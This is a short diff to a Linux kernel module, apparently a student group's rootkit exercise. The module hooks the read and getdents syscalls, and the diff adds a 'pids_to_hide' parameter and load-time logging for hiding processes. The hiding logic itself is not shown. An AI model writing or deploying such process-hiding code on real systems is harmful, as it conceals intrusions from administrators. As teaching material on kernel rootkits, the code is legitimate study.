@@ -8,6 +8,7 @@
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 #include <asm/uaccess.h>
+#include <linux/moduleparam.h>
 
 #include "sysmap.h"          /* Pointers to system functions */
 
@@ -51,6 +52,11 @@ typedef asmlinkage ssize_t (*fun_long_int_linux_dirent64_int)(unsigned int, stru
 fun_ssize_t_int_pvoid_size_t     original_read;
 fun_long_int_linux_dirent_int    original_getdents;
 fun_long_int_linux_dirent64_int  original_getdents64;
+
+static int pids_to_hide[200];
+static int pids_count = 0;
+module_param_array(pids_to_hide, int, &pids_count, 0000);
+MODULE_PARM_DESC(pids_to_hide, "Process IDs that shall be hidden.");
 
 /* Make a certain address writeable */
 void make_page_writable(long unsigned int _addr){
@@ -194,7 +200,12 @@ int print_nr_procs(void){
 /* Initialization routine */
 static int __init _init_module(void)
 {
+    int i;
     printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
+    printk(KERN_INFO "Received %d PIDs to hide:\n", pids_count);
+    for (i = 0; i < sizeof(pids_to_hide)/sizeof(int); i++) {
+        printk(KERN_INFO "pids_to_hide[%d] = %d\n", i, pids_to_hide[i]);
+    }
     print_nr_procs();
     hook_functions();
     return 0;
